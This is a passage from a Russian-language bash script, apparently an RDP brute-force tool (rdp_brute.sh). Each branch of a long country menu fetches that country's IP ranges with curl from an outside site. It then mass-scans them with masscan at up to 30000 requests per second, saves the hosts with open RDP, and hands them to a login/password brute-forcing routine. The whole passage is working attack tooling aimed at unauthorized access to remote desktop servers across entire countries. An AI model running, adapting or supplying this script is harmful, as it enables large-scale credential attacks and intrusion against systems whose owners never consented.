echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "155" ]; then
curl http://ipdiapazon.16mb.com/Russia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g" |sed '$d'>list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "156" ]; then
curl http://ipdiapazon.16mb.com/Rwanda.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "157" ]; then
curl http://ipdiapazon.16mb.com/Saint.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "158" ]; then
curl http://ipdiapazon.16mb.com/Saint_lucia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "159" ]; then
curl http://ipdiapazon.16mb.com/Samoa.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "160" ]; then
curl http://ipdiapazon.16mb.com/San_marino.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "161" ]; then
curl http://ipdiapazon.16mb.com/Saudi_arabia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "162" ]; then
curl http://ipdiapazon.16mb.com/Senegal.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "163" ]; then
curl http://ipdiapazon.16mb.com/Serbia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "164" ]; then
curl http://ipdiapazon.16mb.com/Seychelles.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "165" ]; then
curl http://ipdiapazon.16mb.com/Sierra_leone.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "166" ]; then
curl http://ipdiapazon.16mb.com/Singapore.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "167" ]; then
curl http://ipdiapazon.16mb.com/Slovakia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "168" ]; then
curl http://ipdiapazon.16mb.com/Slovenia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "169" ]; then
curl http://ipdiapazon.16mb.com/Solomon_islands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "170" ]; then
curl http://ipdiapazon.16mb.com/South_africa.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "171" ]; then
curl http://ipdiapazon.16mb.com/Spain.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "172" ]; then
curl http://ipdiapazon.16mb.com/Sri_lanka.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



